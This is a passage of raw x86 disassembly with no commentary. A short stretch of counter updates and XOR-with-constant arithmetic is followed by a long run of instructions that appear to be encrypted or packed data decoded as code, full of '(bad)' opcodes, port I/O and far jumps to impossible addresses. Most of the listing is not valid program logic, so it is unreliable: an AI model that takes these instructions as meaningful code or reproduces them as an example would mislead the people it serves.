  4018a9:	mov    ebx,DWORD PTR ds:0x4306c2
  4018af:	dec    ebx
  4018b0:	mov    DWORD PTR ds:0x4306c2,ebx
  4018b6:	jmp    0x401884
  4018bb:	add    DWORD PTR ds:0x42e8de,0x42e8e2
  4018c5:	mov    eax,DWORD PTR [ebp-0x14]
  4018c8:	or     ecx,0x5402
  4018ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4018d1:	mov    ecx,0x7510856
  4018d6:	xor    eax,ecx
  4018d8:	mov    esi,0x32729d
  4018dd:	sbb    DWORD PTR ds:0x430632,0x704c
  4018e7:	xor    ebx,ecx
  4018e9:	xor    edx,edx
  4018eb:	xor    DWORD PTR ds:0x42e8ea,0x4306c2
  4018f5:	add    eax,esi
  4018f7:	add    ebx,esi
  4018f9:	sbb    DWORD PTR ds:0x4306d2,0x21a7
  401903:	jmp    0x401cb4
  401908:	ret    0xa9a5
  40190b:	imul   ebp,DWORD PTR [ecx+0x7b],0xffffffc4
  40190f:	mov    ebp,0x8064be64
  401914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401915:	inc    BYTE PTR [ebx+0x7e7516d4]
  40191b:	jle    0x40189f
  40191d:	jno    0x40199d
  40191f:	jle    0x401959
  401921:	mov    al,0x27
  401923:	je     0x4018e8
  401925:	mov    bl,0xf8
  401927:	sbb    eax,edx
  401929:	xchg   edx,eax
  40192a:	shr    DWORD PTR [ecx],1
  40192c:	push   es
  40192d:	(bad)  
  40192f:	imul   edi,DWORD PTR [ecx+0x59062240],0x97599155
  401939:	push   eax
  40193a:	adc    bh,dh
  40193c:	in     al,dx
  40193d:	xchg   edx,eax
  40193e:	repz popf 
  401940:	cmp    eax,0x5ed74f3c
  401945:	stos   DWORD PTR es:[edi],eax
  401946:	inc    esi
  401947:	pop    esi
  401948:	mov    ah,0x20
  40194a:	call   0x6c49ddb1
  40194f:	dec    ebx
  401950:	lods   al,BYTE PTR ds:[esi]
  401951:	dec    ecx
  401952:	cmp    DWORD PTR [ecx],edx
  401954:	xlat   BYTE PTR ds:[ebx]
  401955:	sub    DWORD PTR [eax+edx*2+0x710b4396],0x4605ecd8
  401960:	jb     0x4018ef
  401962:	jno    0x401969
  401964:	in     eax,dx
  401965:	sbb    eax,0x622d2c1a
  40196a:	ret    
  40196b:	sub    al,BYTE PTR [ebp+0x71]
  40196e:	add    esi,DWORD PTR [edi]
  401970:	mov    ds:0xd760a8d9,al
  401975:	xchg   esp,eax
  401976:	sbb    DWORD PTR [ebp-0x19],ebp
  401979:	adc    ebx,edx
  40197b:	or     edx,ebp
  40197d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40197e:	int3   
  40197f:	neg    ch
  401981:	retf   
  401982:	popf   
  401983:	cli    
  401984:	in     al,dx
  401985:	sbb    eax,0x1d93228e
  40198a:	dec    ebx
  40198b:	sub    al,0x4d
  40198d:	scas   al,BYTE PTR es:[edi]
  40198e:	mov    dh,0x88
  401990:	(bad)  
  401991:	bound  esi,QWORD PTR [eax-0x1a1efc86]
  401997:	loopne 0x401a09
  401999:	jae    0x4019cf
  40199b:	pop    esi
  40199c:	push   0x0
  40199e:	jl     0x4019af
  4019a0:	adc    dl,al
  4019a2:	cdq    
  4019a3:	loope  0x4019e7
  4019a5:	call   0x8ca6:0x2d0fc7b1
  4019ac:	cwde   
  4019ad:	stos   BYTE PTR es:[edi],al
  4019ae:	in     eax,0xfc
  4019b0:	(bad)  
  4019b1:	test   BYTE PTR [ecx],0xe8
  4019b4:	inc    esi
  4019b5:	mov    edx,0x95fe4b40
  4019ba:	pusha  
  4019bb:	mov    ds:0x48efdf43,eax
  4019c0:	xchg   ebp,eax
  4019c1:	jo     0x4019ba
  4019c3:	rol    DWORD PTR [ebp+0x2e],1
  4019c6:	mov    bh,0xc0
  4019c8:	mov    cl,cl
  4019ca:	and    dl,BYTE PTR [edx+0x57]
  4019cd:	sub    al,BYTE PTR [ebp+0x50]
  4019d0:	sub    edi,ecx
  4019d2:	and    esi,ecx
  4019d4:	loope  0x401a1d
  4019d6:	out    dx,al
  4019d7:	push   cs
  4019d8:	jne    0x4019f7
  4019da:	mov    dh,0xe1
  4019dc:	push   0xffffffd3
  4019de:	pop    ebx
  4019df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019e0:	sbb    edx,0x4e
  4019e3:	adc    eax,0x68278ca6
  4019e8:	das    
  4019e9:	out    0x94,eax
  4019eb:	and    eax,0x9c217e36
  4019f0:	dec    esi
  4019f1:	cwde   
  4019f2:	or     BYTE PTR [esi-0x44],ah
  4019f5:	sub    ah,BYTE PTR [ecx+ebp*4+0x1d987432]
  4019fc:	push   edx
  4019fd:	sub    dh,dh
  4019ff:	and    ch,BYTE PTR [eax-0x32c57abc]
  401a05:	out    0xc7,eax
  401a07:	cmp    DWORD PTR [ebp+0x40],esi
  401a0a:	loop   0x401a66
  401a0c:	push   cs
  401a0d:	push   0x2d
  401a0f:	pusha  
  401a10:	sub    ecx,DWORD PTR [edi+0x13]
  401a13:	ds nop
  401a15:	xchg   BYTE PTR [edi+0x2b],dh
  401a18:	inc    esi
  401a19:	mov    ebx,0xcc27cab
  401a1e:	lods   eax,DWORD PTR ds:[esi]
  401a1f:	sbb    bl,dl
  401a21:	in     eax,dx
  401a22:	push   0x29c84b7a
  401a27:	loop   0x401a48
  401a29:	fsubr  QWORD PTR [ebp+edi*8-0xe943e4f]
  401a30:	mov    BYTE PTR [ecx+0x941892],bl
  401a36:	js     0x4019ed
  401a38:	and    BYTE PTR [ecx],cl
  401a3a:	sub    dl,0xd3
  401a3d:	and    al,0x26
  401a3f:	jb     0x401a62
  401a41:	add    eax,DWORD PTR [esi+0x493615a]
  401a47:	adc    al,0xd6
  401a49:	cld    
  401a4a:	outs   dx,DWORD PTR ds:[esi]
  401a4b:	fs xor al,0x9c
  401a4e:	and    al,0xd4
  401a50:	push   cs
  401a51:	test   DWORD PTR [ecx+eax*4-0x6],ecx
  401a55:	add    eax,0x62ca5bad
  401a5a:	aaa    
  401a5b:	jmp    0xe6e4b4a3
  401a60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a61:	push   0x962f4a76
  401a66:	cmp    ebp,DWORD PTR [ecx+edx*8]
  401a69:	int3   
  401a6a:	sar    BYTE PTR [edx-0x2f],0x29
  401a6e:	or     eax,0x4c633850
  401a73:	mov    cl,0xed
  401a75:	in     eax,dx
  401a76:	aam    0x78
  401a78:	xor    eax,0xf9c2b42
  401a7d:	pop    esi
  401a7e:	jp     0x401a73
  401a80:	xor    DWORD PTR [ebp+0x2121dafb],edx
  401a86:	xor    al,BYTE PTR [esi+0x3039964f]
  401a8c:	mov    bh,0x60
  401a8e:	cmp    bh,BYTE PTR [ecx]
  401a90:	stos   BYTE PTR es:[edi],al
  401a91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a92:	add    ebp,DWORD PTR [edi+0x3e]
  401a95:	and    edx,edx
  401a97:	into   
  401a98:	push   ecx
  401a99:	push   ss
  401a9a:	mov    dh,0xac
  401a9c:	xchg   DWORD PTR [eax],ebx
  401a9e:	or     esi,DWORD PTR [ebx-0x12061728]
  401aa4:	mov    eax,ds:0x4dc220a3
  401aa9:	dec    ecx
  401aaa:	sar    BYTE PTR [ebx],cl
  401aac:	mov    ebx,0x3f4d2dd1
  401ab1:	add    eax,0xb6e3aaeb
  401ab6:	or     bl,BYTE PTR [eax+esi*4-0x54]
  401aba:	int    0x99
  401abc:	push   0xffffff9c
  401abe:	addr16 aas 
  401ac0:	ror    BYTE PTR [ebp+0x490c915d],1
  401ac6:	mov    ebp,0x7509a53e
  401acb:	stos   BYTE PTR es:[edi],al
  401acc:	xchg   ecx,eax
  401acd:	cwde   
  401ace:	dec    ebp
  401acf:	mov    ds:0x36be48be,eax
  401ad4:	jle    0x401ae4
  401ad6:	mov    BYTE PTR [edx+0x4798187f],bh
  401adc:	add    BYTE PTR [ecx+edi*2],ah
  401adf:	add    al,al
  401ae1:	cmp    dl,al
  401ae3:	out    dx,al
  401ae4:	push   eax
  401ae5:	jnp    0x401b10
  401ae7:	aaa    
  401ae8:	dec    edx
  401ae9:	cli    
  401aea:	(bad)  
  401aeb:	and    al,BYTE PTR [edi]
  401aed:	push   ebp
  401aee:	jmp    DWORD PTR [esi]
  401af0:	add    edi,DWORD PTR [edi-0x3382afd5]
  401af6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401af7:	push   edi
  401af8:	mov    edx,DWORD PTR [ebp+0x216b4a68]
  401afe:	and    BYTE PTR [edx],cl
  401b00:	out    dx,al
  401b01:	and    eax,0xa353378f
  401b06:	jp     0x401b72
  401b08:	js     0x401a94
  401b0a:	cs int 0xa5
  401b0d:	icebp  
  401b0e:	push   ecx
  401b0f:	call   0x40f1bca7
  401b14:	and    edx,DWORD PTR [esi+edx*4-0x160945d]
  401b1b:	or     DWORD PTR [edx],edi
  401b1d:	(bad)
  401b20:	ss dec eax
  401b22:	cld    
  401b23:	or     eax,0x2de602be
  401b28:	inc    eax
  401b29:	adc    eax,DWORD PTR [ecx+0x7651ab35]
  401b2f:	loope  0x401b39
  401b31:	push   ebp
  401b32:	cmp    dl,BYTE PTR [ebp+0x43]
  401b35:	xlat   BYTE PTR ds:[ebx]
  401b36:	fs push es
  401b38:	inc    ebx
  401b39:	mov    ds:0xb1b72802,eax
  401b3e:	in     al,0x73
  401b40:	cli    
  401b41:	mov    ch,0xd1
  401b43:	jbe    0x401b31
  401b45:	lods   eax,DWORD PTR ds:[esi]
  401b46:	cmp    DWORD PTR [ebx+0x7e812940],edi
  401b4c:	cmc    
  401b4d:	(bad)  
  401b4e:	loopne 0x401b19
  401b50:	adc    DWORD PTR [edi-0x2ab55d3],ebx
  401b56:	ins    BYTE PTR es:[edi],dx
  401b57:	push   0xfdd05400
  401b5c:	adc    eax,0x81e0bb49
  401b61:	sbb    ah,bl
  401b63:	iret   
  401b64:	out    0x79,eax
  401b66:	pop    eax
  401b67:	(bad)  
  401b68:	or     DWORD PTR [eax],ebx
  401b6a:	imul   ebp,DWORD PTR gs:[edx],0xa99f13e0
  401b71:	jns    0x401b03
  401b73:	jo     0x401bbe
  401b75:	sbb    ebp,ebp
  401b77:	jl     0x401bee
  401b79:	loopne 0x401b52
  401b7b:	dec    ecx
  401b7c:	ja     0x401b66
  401b7e:	xor    al,0x19
  401b80:	rcl    DWORD PTR [ebx+0x60],0xc4
  401b84:	xchg   ebp,eax
  401b85:	in     al,0x62
  401b87:	dec    edx
  401b88:	(bad)  
  401b89:	aas    
  401b8a:	inc    ebp
  401b8b:	aam    0x3d
  401b8d:	cmp    al,0xf9
  401b8f:	pop    edx
  401b90:	repnz or BYTE PTR [ebx+0x10],cl
  401b94:	pop    esi
  401b95:	add    eax,0x7ee02eaf
  401b9a:	scas   al,BYTE PTR es:[edi]
  401b9b:	or     al,0xf9
  401b9d:	push   edx
  401b9e:	mov    edi,0x6ab589b9
  401ba3:	cld    
  401ba4:	jae    0x401b72
  401ba6:	jmp    0xd9b611
  401bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bac:	or     eax,0x25c2174
  401bb1:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bb3:	jne    0x401ba4
  401bb5:	daa    
  401bb6:	je     0x401b90
  401bb8:	std    
  401bb9:	xor    al,0xa1
  401bbb:	call   0x24d3:0x91a203ca
  401bc2:	arpl   sp,bx
  401bc4:	mov    eax,cs
  401bc6:	push   cs
  401bc7:	idiv   DWORD PTR [ebx]
  401bc9:	cdq    
  401bca:	nop
  401bcb:	aas    
  401bcc:	sbb    BYTE PTR [edi-0x46],ah
  401bcf:	xchg   BYTE PTR [eax-0x51d79b63],ah
  401bd5:	xchg   ecx,eax
  401bd6:	jb     0x401c1a
  401bd8:	push   edi
  401bd9:	lds    esp,FWORD PTR [ebp+0x34632c1d]
  401bdf:	mov    eax,0x83627b69
  401be4:	pop    ecx
  401be5:	loopne 0x401c3f
  401be7:	shl    DWORD PTR [edi-0x6a580a7],cl
  401bed:	push   cs
  401bee:	cmp    dl,0xec
  401bf1:	fiadd  WORD PTR [edi+0x12]
  401bf4:	jns    0x401bb8
  401bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bf7:	dec    edi
  401bf8:	sub    esp,edi
  401bfa:	jb     0x401c0f
  401bfc:	push   0xffffffec
  401bfe:	out    dx,eax
  401bff:	inc    ebp
  401c00:	dec    edx
  401c01:	and    eax,0xf6b943c8
  401c06:	and    al,0x34
  401c08:	inc    edi
  401c09:	jmp    0x6ede:0xbc891d48
  401c10:	mov    al,ds:0x485dfc7f
  401c15:	call   0x1045:0x3f6cb5dc
  401c1c:	ds xchg esp,eax
  401c1e:	sbb    DWORD PTR [esi+0x687f1f29],esi
  401c24:	lock push cs
  401c26:	pop    esi
  401c27:	push   es
  401c28:	mov    ds:0x2a7a3d78,al
  401c2d:	dec    eax
  401c2e:	adc    edi,esp
  401c30:	adc    al,0xb9
  401c32:	jb     0x401bcf
  401c34:	sub    DWORD PTR [ebp+0x42c7984d],esi
  401c3a:	pop    ebx
  401c3b:	sbb    BYTE PTR [ebx-0x47],ch
  401c3e:	popa   
  401c3f:	inc    BYTE PTR [edi]
  401c41:	jno    0x401c19
  401c43:	jl     0x401bc9
  401c45:	les    esi,FWORD PTR [edx-0x36]
  401c48:	push   ecx
  401c49:	xlat   BYTE PTR ds:[ebx]
  401c4a:	push   edi
  401c4b:	out    0x28,eax
  401c4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c4e:	dec    edi
  401c4f:	jne    0x401cc2
  401c51:	inc    edi
  401c52:	xchg   edx,eax
  401c53:	pop    esi
  401c54:	enter  0x8ed4,0xca
  401c58:	sub    al,0xde
  401c5a:	xchg   ebx,eax
  401c5b:	shl    BYTE PTR [ebx],0x77
  401c5e:	iret   
  401c5f:	push   0x9aa1d8fc
  401c64:	cmc    
  401c65:	in     al,0x13
  401c67:	enter  0xbc37,0x71
  401c6b:	test   al,0x1
  401c6d:	xchg   esi,eax
  401c6e:	dec    esp
  401c6f:	pop    ebp
  401c70:	cmp    BYTE PTR [ebp+0x17f266d5],0xea
  401c77:	gs pop esp
  401c79:	or     ebx,ebp
  401c7b:	(bad)  
  401c7c:	hlt    
  401c7d:	inc    esi
  401c7e:	adc    dl,cl
  401c80:	retf   0x1f22
  401c83:	bound  ecx,QWORD PTR [eax-0x77a3b3f]
  401c89:	in     al,0x5
  401c8b:	pop    edx
  401c8c:	jg     0x401c30
  401c8e:	mov    bl,0x9d
  401c90:	xor    BYTE PTR [eax],ch
  401c92:	(bad)  [eax-0x4303ea70]
  401c98:	xor    BYTE PTR [ebp+0x5e950818],al
  401c9e:	lods   eax,DWORD PTR ds:[esi]
  401c9f:	out    0x4c,al
  401ca1:	xchg   ebp,eax
  401ca2:	jg     0x401c51
  401ca4:	fcmovne st,st(1)
  401ca6:	sub    esi,ebp
  401ca8:	or     eax,DWORD PTR [ebp+0x40]
  401cab:	xchg   ebx,eax
  401cac:	loopne 0x401cf4
  401cae:	cmp    edx,edx
  401cb0:	inc    esp
  401cb1:	dec    esp
  401cb2:	(bad)  
  401cb3:	icebp  
  401cb4:	div    ebx
  401cb6:	mov    DWORD PTR ds:0x42efa0,0x29
  401cc0:	jmp    0x402071
  401cc5:	pop    ds
  401cc6:	nop
  401cc7:	jl     0x401d20
  401cc9:	jge    0x401d46
  401ccb:	and    eax,0x749e668
  401cd0:	jns    0x401c5e
  401cd2:	push   ecx
  401cd3:	inc    ebx
  401cd4:	sar    DWORD PTR [edx-0x7d8181f8],0x71
  401cdb:	jle    0x401d5b
  401cdd:	jnp    0x401c9f
  401cdf:	ss es dec eax
  401ce2:	ret    
  401ce3:	mov    ebp,0x63d74935
  401ce8:	mov    bh,0xb7
  401cea:	xchg   ebp,eax
  401ceb:	clc    
  401cec:	(bad)  
  401cee:	sub    DWORD PTR [edx+0x7088f9b3],ecx
  401cf4:	inc    eax
  401cf5:	scas   al,BYTE PTR es:[edi]
  401cf6:	add    dl,bh
  401cf8:	mov    ebp,0x50431a9f
  401cfd:	jmp    0xa5de:0xe0a485e5
  401d04:	mov    al,cl
  401d06:	popa   
  401d07:	mov    eax,ds:0xdef17a0e
  401d0c:	pop    ecx
  401d0d:	loopne 0x401cbd
  401d0f:	outs   dx,DWORD PTR ds:[esi]
  401d10:	xchg   DWORD PTR [ebp-0x79932e08],ebp
  401d16:	add    al,0x3f
  401d18:	jmp    0xa57f113d
  401d1d:	dec    ebx
  401d1e:	dec    edx
  401d1f:	ja     0x401d70
  401d21:	jmp    0x7c3caedc
  401d26:	scas   eax,DWORD PTR es:[edi]
  401d27:	mov    esp,0x33d1be41
  401d2c:	or     al,0x2
  401d2e:	jo     0x401cd9
  401d30:	xor    bh,BYTE PTR [ecx+0x52ffe12]
  401d36:	push   ecx
  401d37:	mov    ds:0x7df36c8b,al
  401d3c:	in     al,dx
  401d3d:	cmc    
  401d3e:	fcmovne st,st(5)
  401d40:	out    dx,eax
  401d41:	add    ecx,DWORD PTR [ebx]
  401d43:	xor    DWORD PTR [eax-0x55],0x62edf2c4
  401d4a:	(bad)  
  401d4b:	cwde   
  401d4c:	inc    edx
  401d4d:	int    0x4e
  401d4f:	dec    ebp
  401d50:	mul    DWORD PTR [edx+0x5e]
  401d53:	rcr    BYTE PTR [edi-0x2b1a0791],0xdf
  401d5a:	jmp    0xb97c4c87
  401d5f:	out    0xaa,eax
  401d61:	es sub dh,0xf0
  401d65:	xchg   ebx,eax
  401d66:	adc    al,0xfb
  401d68:	xor    eax,ebx
  401d6a:	xor    edi,esp
  401d6c:	fadd   DWORD PTR [edx+0x4f]
  401d6f:	sub    DWORD PTR [ecx+0xe1a31d6],esp
  401d75:	fstp   DWORD PTR [edx]
  401d77:	test   al,0xf7
  401d79:	test   eax,ecx
  401d7b:	stos   DWORD PTR es:[edi],eax
  401d7c:	inc    esi
  401d7d:	push   edi
  401d7e:	mov    cl,0xab
  401d80:	fbld   TBYTE PTR [edi+0x7b]
  401d83:	add    al,0x5c
  401d85:	out    dx,al
  401d86:	jbe    0x401dd6
  401d88:	adc    ah,ah
  401d8a:	inc    esi
  401d8b:	dec    edx
  401d8c:	inc    edi
  401d8d:	jmp    0x5fea7c7a
  401d92:	call   0x691010e3
  401d97:	push   esi
  401d98:	jns    0x401dbf
  401d9a:	xchg   ecx,eax
  401d9b:	dec    esp
  401d9c:	rol    DWORD PTR [edi+0x5d607d96],1
  401da2:	fs aam 0x24
  401da5:	dec    edi
  401da6:	mov    al,0xaf
  401da8:	aam    0xfa
  401daa:	jmp    0x401d49
  401dac:	mov    WORD PTR [ecx+ecx*1],ss
  401daf:	or     DWORD PTR [ebp+0x6d63977e],eax
  401db5:	pminsw mm0,QWORD PTR gs:[ecx-0x60]
  401dba:	inc    edi
  401dbb:	mov    eax,0xc67b2a8e
  401dc0:	rcl    DWORD PTR [esi+ebx*8],cl
  401dc3:	xor    BYTE PTR [ebx+0x6db20619],ah
  401dc9:	daa    
  401dca:	icebp  
  401dcb:	push   edi
  401dcc:	push   edx
  401dcd:	inc    BYTE PTR [ebx]
  401dcf:	fcom   QWORD PTR [ecx-0x2c28c287]
  401dd5:	cmp    DWORD PTR [ebp-0x18],ebp
  401dd8:	retf   
  401dd9:	icebp  
  401dda:	pop    edx
  401ddb:	sti    
  401ddc:	imul   edx,DWORD PTR [edx],0xffffffed
  401ddf:	cmp    DWORD PTR [ebx+0x3],0x5ac71498
  401de6:	in     eax,0x97
  401de8:	jnp    0x401e57
  401dea:	push   cs
  401deb:	and    al,dh
  401ded:	add    bh,BYTE PTR [ecx+edx*4]
  401df0:	aaa    
  401df1:	ret    0xdad9
  401df4:	dec    ebx
  401df5:	shl    ebx,cl
  401df7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401df8:	hlt    
  401df9:	mov    gs,WORD PTR [ebp+0x53f0dc97]
  401dff:	mov    eax,ss
  401e01:	(bad)  [esi+0x3a]
  401e04:	inc    ecx
  401e05:	repnz sbb BYTE PTR [edx+0x4c044a21],dh
  401e0c:	adc    eax,0xdd6e5d54
  401e11:	sbb    al,BYTE PTR [ecx]
  401e13:	sti    
  401e14:	(bad)  
  401e15:	das    
  401e16:	push   esp
  401e17:	clc    
  401e18:	inc    ecx
  401e19:	mov    eax,0xedf380e0
  401e1e:	push   ss
  401e1f:	out    dx,al
  401e20:	les    edi,FWORD PTR [eax-0x69]
  401e23:	jle    0x401e29
  401e25:	or     al,0xab
  401e27:	mov    DWORD PTR [edx+esi*4-0x76],ebp
  401e2b:	push   cs
  401e2c:	gs (bad) 
  401e2e:	push   esi
  401e2f:	xor    BYTE PTR ds:0x29cb5e27,al
  401e35:	scas   eax,DWORD PTR es:[edi]
  401e36:	rol    DWORD PTR [eax+0x50653cb8],0x55
  401e3d:	xchg   esi,eax
  401e3e:	inc    esp
  401e3f:	and    BYTE PTR [esi-0x51],dl
  401e42:	jmp    0x85ff:0x5f49dd69
  401e49:	icebp  
  401e4a:	ins    BYTE PTR es:[edi],dx
  401e4b:	js     0x401e6f
  401e4d:	add    dl,ch
  401e4f:	cmp    eax,0x1f0414b8
  401e54:	sub    cl,BYTE PTR [esi-0x37]
  401e57:	js     0x401dff
  401e59:	stos   DWORD PTR es:[edi],eax
  401e5a:	jae    0x401e23
  401e5c:	or     DWORD PTR [ebx+0x538ffe63],esi
  401e62:	lods   eax,DWORD PTR ds:[esi]
  401e63:	mov    ebx,ds
  401e65:	lods   al,BYTE PTR ds:[esi]
  401e66:	nop
  401e67:	fld    QWORD PTR [ebx+0x39200823]
  401e6d:	xor    DWORD PTR [esi],edi
  401e6f:	dec    BYTE PTR [ebp+eax*2+0xc]
  401e73:	aaa    
  401e74:	push   ebp
  401e75:	addr16 cdq 
  401e77:	adc    BYTE PTR [esi+eiz*4-0x31],ah
  401e7b:	mov    WORD PTR [edx-0xf],?
  401e7e:	cmp    dh,BYTE PTR [edx+0x72980b93]
  401e84:	adc    DWORD PTR [ecx],eax
  401e86:	xlat   BYTE PTR ds:[ebx]
  401e87:	xchg   ebp,eax
  401e88:	inc    esi
  401e89:	std    
  401e8a:	cld    
  401e8b:	ret    
  401e8c:	pop    ds
  401e8d:	inc    ebx
  401e8e:	inc    edi
  401e8f:	std    
  401e90:	test   BYTE PTR [ecx+0x38],dl
  401e93:	xchg   esp,eax
  401e94:	xor    al,0xe5
  401e96:	pop    eax
  401e97:	(bad)  
  401e98:	pop    edi
  401e99:	push   ecx
  401e9a:	dec    esp
  401e9b:	adc    dh,BYTE PTR [edi]
  401e9d:	or     eax,0x6d92d4a7
  401ea2:	fisttp DWORD PTR [ebx]
  401ea4:	sbb    ebx,DWORD PTR [edx+0x3f]
  401ea7:	dec    ebp
  401ea8:	mov    dh,0x1b
  401eaa:	sbb    ebx,eax
  401eac:	and    eax,0x2226baba
  401eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401eb2:	sbb    esp,DWORD PTR [edx]
  401eb4:	or     BYTE PTR [ebx+0x1e650c00],bl
  401eba:	xchg   edx,eax
  401ebb:	mov    dh,0x4
  401ebd:	inc    esi
  401ebe:	jmp    0x401f1b
  401ec0:	(bad)  
  401ec1:	cmc    
  401ec2:	and    dl,ah
  401ec4:	dec    esp
  401ec5:	jbe    0x401eff
  401ec7:	dec    edx
  401ec8:	mov    bh,0x63
  401eca:	jp     0x401e87
  401ecc:	hlt    
  401ecd:	ret    0x662c
  401ed0:	xchg   BYTE PTR [ecx-0x3a],ch
  401ed3:	adc    BYTE PTR [ebp-0x2707a0b1],0x86
  401eda:	ret    0x1d16
  401edd:	push   eax
  401ede:	and    dl,bl
  401ee0:	imul   ebp,DWORD PTR [edx+0x38],0x3f
  401ee4:	pop    ebx
  401ee5:	test   al,ch
  401ee7:	adc    BYTE PTR [ebp-0x15],0xaa
  401eeb:	mov    WORD PTR [edi],ds
  401eed:	or     BYTE PTR [edx-0x4b],cl
  401ef0:	xor    DWORD PTR [ecx],edi
  401ef2:	outs   dx,BYTE PTR ds:[esi]
  401ef3:	add    BYTE PTR [edx-0x48],bh
  401ef6:	push   ebx
  401ef7:	fidiv  WORD PTR [ecx+0x5c70c502]
  401efd:	stos   BYTE PTR es:[edi],al
  401efe:	pushf  
  401eff:	mov    cl,0x9f
  401f01:	jo     0x401edf
  401f03:	scas   al,BYTE PTR es:[edi]
  401f04:	test   DWORD PTR gs:[ebp+0x62],ebp
  401f08:	push   ebp
  401f09:	dec    BYTE PTR [ebx]
  401f0b:	adc    ch,ah
  401f0d:	clc    
  401f0e:	ss inc eax
  401f10:	lea    esp,[ebp-0x2f]
  401f13:	mov    ds:0x526e6b51,al
  401f18:	ds sub eax,0xdeebd76d
  401f1e:	fs retf 
  401f20:	xor    DWORD PTR [edi+eiz*8+0x39752d6a],ebx
  401f27:	cmp    DWORD PTR [ebp+ebp*4-0x5a],edi
  401f2b:	push   ds
  401f2c:	cmp    eax,0x10f45303
  401f31:	rcl    edi,cl
  401f33:	aaa    
  401f34:	lods   al,BYTE PTR ds:[esi]
  401f35:	lods   eax,DWORD PTR ds:[esi]
  401f36:	scas   al,BYTE PTR es:[edi]
  401f37:	leave  
  401f38:	mov    al,0x77
  401f3a:	cdq    
  401f3b:	sub    dh,BYTE PTR [edx+0x18]
  401f3e:	xchg   esp,eax
  401f3f:	lahf   
  401f40:	xor    eax,0x4ea5cf44
  401f45:	hlt    
  401f46:	jbe    0x401f2b
  401f48:	std    
  401f49:	lock dec esp
  401f4b:	dec    esp
  401f4c:	fwait
  401f4d:	mov    bh,0xfc
  401f4f:	or     eax,0xd17f3ff0
  401f54:	inc    edx
  401f55:	adc    ch,BYTE PTR [esi+0x6e9d6ee2]
  401f5b:	fucomip st,st(4)
  401f5d:	out    dx,eax
  401f5e:	pop    esp
  401f5f:	push   esp
  401f60:	test   eax,0x83b5e851
  401f65:	mov    bh,0xbc
  401f67:	loopne 0x401f6d
  401f69:	rol    DWORD PTR [ebx+0x19],0xc7
  401f6d:	ficom  WORD PTR [ebp+0x20]
  401f70:	xchg   BYTE PTR [ebx+0x20],dl
  401f73:	or     cl,BYTE PTR [esi-0x65a2156d]
  401f79:	push   ebp
  401f7a:	loop   0x401f0f
  401f7c:	retf   
  401f7d:	pop    es
  401f7e:	push   ebp
  401f7f:	ds iret 
  401f81:	int    0x0
  401f83:	repz in eax,0x99
  401f86:	jb     0x401fc0
  401f88:	push   edx
  401f89:	cmp    eax,DWORD PTR [eax+ecx*8+0x41]
  401f8d:	ror    DWORD PTR [eax],cl
  401f8f:	dec    eax
  401f90:	and    BYTE PTR [eax+0x59107604],al
  401f96:	push   ds
  401f97:	not    BYTE PTR [ecx-0x207eda64]
  401f9d:	inc    ecx
  401f9e:	rcl    BYTE PTR [edi-0x29],cl
  401fa1:	jbe    0x401ffb
  401fa3:	or     edi,ebx
  401fa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fa6:	(bad)  
  401fa7:	aad    0xe
  401fa9:	mov    eax,0x39e6b56a
  401fae:	adc    al,0x31
  401fb0:	xchg   ebp,eax
  401fb1:	stc    
  401fb2:	dec    ecx
  401fb3:	int    0x13
  401fb5:	xchg   ebp,eax
  401fb6:	(bad)  
  401fb7:	jmp    0x940f:0x3b892b65
  401fbe:	in     eax,0xc7
  401fc0:	rcr    dl,cl
  401fc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fc3:	outs   dx,DWORD PTR ds:[esi]
  401fc4:	mov    ch,0x5
  401fc6:	movntps XMMWORD PTR [eax+0x18d0a30d],xmm1
  401fcd:	pop    eax
  401fce:	les    ebx,FWORD PTR [edx-0x2bb33bf4]
  401fd4:	jae    0x401fb2
  401fd6:	out    0xd7,al
  401fd8:	xchg   ebx,eax
  401fd9:	xchg   BYTE PTR [ebp-0x41d89817],ah
  401fdf:	lods   al,BYTE PTR ds:[esi]
  401fe0:	push   ds
  401fe1:	xchg   esp,eax
  401fe2:	(bad)  
  401fe3:	mov    esi,DWORD PTR [di]
  401fe6:	add    al,0x8e
  401fe8:	push   esp
  401fe9:	fistp  QWORD PTR [ecx]
  401feb:	arpl   WORD PTR [edi+0x3d],sp
  401fee:	ret    0x6bc2
  401ff1:	sub    al,0x63
  401ff3:	push   esp
  401ff4:	mov    ch,0xeb
  401ff6:	icebp  
  401ff7:	inc    ebp
  401ff8:	sub    DWORD PTR [edx+0x7d],0x74618a99
  401fff:	xor    edi,ebp
  402001:	cmp    BYTE PTR [ecx+0x69ed579e],bh
  402007:	dec    ebp
  402008:	(bad)  
  402009:	call   DWORD PTR [ebp+0x11c55078]
  40200f:	fidiv  DWORD PTR [eax+0xa]
  402012:	push   edx
  402013:	std    
  402014:	xchg   DWORD PTR [esi+0x60444d98],esi
  40201a:	stc    
  40201b:	mov    ebp,?
  40201d:	pop    es
  40201e:	xchg   BYTE PTR ds:0x603e58c6,ah
  402024:	jecxz  0x402014
  402026:	popa   
  402027:	inc    edi
  402028:	xor    al,0x64
  40202a:	pusha  
  40202b:	test   ebx,esp
  40202d:	outs   dx,BYTE PTR ds:[esi]
  40202e:	dec    ebx
  40202f:	ds (bad) 
  402031:	mov    esi,0x7d790013
  402036:	outs   dx,DWORD PTR ds:[esi]
  402037:	into   
  402038:	bound  esi,QWORD PTR [edi]
  40203a:	dec    edx
  40203b:	inc    ebx
  40203c:	test   DWORD PTR [eax+0x57],ecx
  40203f:	test   BYTE PTR [esi+eax*2+0x28],0xa2
  402044:	shl    BYTE PTR [eax-0x2d],0xa6
  402048:	je     0x401fcf
  40204a:	mov    ecx,0x46a59a4
